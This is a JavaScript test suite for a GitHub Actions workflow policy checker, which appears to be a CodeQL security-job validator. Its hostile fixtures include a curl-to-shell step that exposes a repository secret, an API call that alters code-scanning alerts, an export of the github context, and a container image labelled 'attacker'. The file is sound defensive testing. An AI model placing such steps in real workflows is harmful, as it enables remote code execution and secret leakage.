import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import test from 'node:test'

function analyze(file, source) {
  const result = spawnSync('python3', ['.github/review/workflow-policy.py'], {
    encoding: 'utf8',
    input: JSON.stringify([{ file, source }]),
  })
  assert.equal(result.status, 0, result.stderr)
  return JSON.parse(result.stdout)
}

const workflow = (permissions, extra = '') => `
name: Source security
on:
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
  push:
    branches: [main]
  merge_group: {}
  workflow_dispatch: {}
permissions: {}
jobs:
  analyze:
    name: CodeQL / \${{ matrix.language }}
    permissions:
${permissions}
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        include:
          - language: go
            build-mode: autobuild
          - language: javascript-typescript
            build-mode: none
    steps:
      - name: Check out the proposed revision
        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
        with:
          persist-credentials: false
      - name: Initialize CodeQL
        uses: github/codeql-action/init@99df26d4f13ea111d4ec1a7dddef6063f76b97e9
        with:
          languages: \${{ matrix.language }}
          build-mode: \${{ matrix.build-mode }}
          queries: security-extended
      - name: Autobuild Go
        if: \${{ matrix.build-mode == 'autobuild' }}
        uses: github/codeql-action/autobuild@99df26d4f13ea111d4ec1a7dddef6063f76b97e9
      - name: Analyze source
        uses: github/codeql-action/analyze@99df26d4f13ea111d4ec1a7dddef6063f76b97e9
        with:
          category: /language:\${{ matrix.language }}
${extra}
`

test('allows only CodeQL result upload in the dedicated source-security job', () => {
  assert.deepEqual(
    analyze(
      '.github/workflows/source-security.yml',
      workflow('      actions: read\n      contents: read\n      security-events: write'),
    ),
    [],
  )
})

test('rejects source-security content or pull-request writes', () => {
  const findings = analyze(
    '.github/workflows/source-security.yml',
    workflow('      actions: read\n      contents: write\n      pull-requests: write\n      security-events: write'),
  )
  assert.equal(findings.length, 1)
  assert.match(findings[0], /contents, pull-requests, security-events/)
})

test('rejects CodeQL upload permission in every other workflow or scope', () => {
  assert.equal(
    analyze(
      '.github/workflows/untrusted.yml',
      workflow('      actions: read\n      contents: read\n      security-events: write'),
    ).length,
    1,
  )
  assert.equal(
    analyze(
      '.github/workflows/source-security.yml',
      `on: pull_request\npermissions:\n  security-events: write\njobs: {}`,
    ).length,
    1,
  )
})

test('rejects fake SARIF upload, alert API mutation, or CodeQL upload suppression', () => {
  const fakeUpload = workflow(
    '      actions: read\n      contents: read\n      security-events: write',
  ).replace(
    'github/codeql-action/analyze@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
    'github/codeql-action/upload-sarif@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
  )
  assert.equal(analyze('.github/workflows/source-security.yml', fakeUpload).length, 1)

  const apiMutation = workflow(
    '      actions: read\n      contents: read\n      security-events: write',
    '      - run: gh api repos/example/project/code-scanning/alerts/1 -X PATCH\n        env:\n          GH_TOKEN: \${{ github.token }}',
  )
  assert.equal(analyze('.github/workflows/source-security.yml', apiMutation).length, 1)

  const noUpload = workflow(
    '      actions: read\n      contents: read\n      security-events: write',
  ).replace(
    '          category: /language:\${{ matrix.language }}',
    '          category: /language:\${{ matrix.language }}\n          upload: false',
  )
  assert.equal(analyze('.github/workflows/source-security.yml', noUpload).length, 1)
})

test('allows full-SHA upgrades from the trusted source-security action repositories', () => {
  const permissions = '      actions: read\n      contents: read\n      security-events: write'
  const upgraded = workflow(permissions).replace(
    'actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0',
    `actions/checkout@${'a'.repeat(40)}`,
  ).replaceAll(
    'github/codeql-action/init@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
    `github/codeql-action/init@${'b'.repeat(40)}`,
  ).replaceAll(
    'github/codeql-action/autobuild@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
    `github/codeql-action/autobuild@${'b'.repeat(40)}`,
  ).replaceAll(
    'github/codeql-action/analyze@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
    `github/codeql-action/analyze@${'b'.repeat(40)}`,
  )
  assert.deepEqual(analyze('.github/workflows/source-security.yml', upgraded), [])
})

test('rejects mutable refs, mixed CodeQL revisions, and lookalike action repositories', () => {
  const permissions = '      actions: read\n      contents: read\n      security-events: write'
  const valid = workflow(permissions)
  const variants = [
    valid.replace(
      'github/codeql-action/init@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
      'github/codeql-action/init@v4.37.1',
    ),
    valid.replace(
      'github/codeql-action/init@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
      `github/codeql-action/init@${'b'.repeat(40)}`,
    ),
    valid.replace(
      'github/codeql-action/init@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
      'github/codeql-actions/init@99df26d4f13ea111d4ec1a7dddef6063f76b97e9',
    ),
  ]
  for (const variant of variants) {
    assert.equal(analyze('.github/workflows/source-security.yml', variant).length, 1)
  }
})

test('rejects quoted and unquoted trigger keys that normalize to the same Actions key', () => {
  const permissions = '      actions: read\n      contents: read\n      security-events: write'
  const conflictingTriggers = workflow(permissions)
    .replace('\non:\n  pull_request:', '\n"on":\n  pull_request:')
    .replace('\npermissions: {}', '\non:\n  pull_request_target: {}\npermissions: {}')
  const findings = analyze('.github/workflows/source-security.yml', conflictingTriggers)
  assert.equal(findings.length, 1)
  assert.match(findings[0], /workflow YAML is invalid:.*duplicate key 'on'/s)
})

test('rejects every run step, github context export, and checkout credential persistence', () => {
  const permissions = '      actions: read\n      contents: read\n      security-events: write'
  assert.equal(
    analyze(
      '.github/workflows/source-security.yml',
      workflow(permissions, '      - run: echo harmless'),
    ).length,
    1,
  )

  const contextExport = workflow(permissions).replace(
    '    steps:',
    '    env:\n      CTX: \${{ toJSON(github) }}\n    steps:',
  )
  assert.equal(analyze('.github/workflows/source-security.yml', contextExport).length, 1)

  const persisted = workflow(permissions).replace(
    '        with:\n          persist-credentials: false\n',
    '',
  )
  assert.equal(analyze('.github/workflows/source-security.yml', persisted).length, 1)
})

test('rejects skipped analysis, wrong languages, custom runners, containers, and extra context', () => {
  const permissions = '      actions: read\n      contents: read\n      security-events: write'
  const valid = workflow(permissions)
  const variants = [
    valid.replace('      - name: Analyze source', '      - name: Analyze source\n        if: false'),
    valid.replace('    permissions:', '    continue-on-error: true\n    permissions:'),
    valid.replace('          - language: go', '          - language: actions'),
    valid.replace('permissions: {}', 'env:\n  CTX: \${{ toJSON(github) }}\npermissions: {}'),
    valid.replace('          category: /language:\${{ matrix.language }}', '          category: \${{ toJSON(github) }}'),
    valid.replace('    runs-on: ubuntu-24.04', '    runs-on: self-hosted'),
    valid.replace('    runs-on: ubuntu-24.04', '    runs-on: ubuntu-24.04\n    container: attacker/image:latest'),
  ]
  for (const variant of variants) {
    assert.equal(analyze('.github/workflows/source-security.yml', variant).length, 1)
  }
})

test('continues to reject pull_request_target, secrets, and network-to-shell', () => {
  const findings = analyze(
    '.github/workflows/source-security.yml',
    `
on:
  pull_request:
  pull_request_target:
jobs:
  analyze:
    runs-on: ubuntu-24.04
    steps:
      - run: curl https://example.invalid/install | sh
        env:
          TOKEN: \${{ secrets.TOKEN }}
`,
  )
  assert.ok(findings.some((finding) => finding.includes('pull_request_target is forbidden')))
  assert.ok(findings.some((finding) => finding.includes('repository secrets')))
  assert.ok(findings.some((finding) => finding.includes('piping network content')))
})
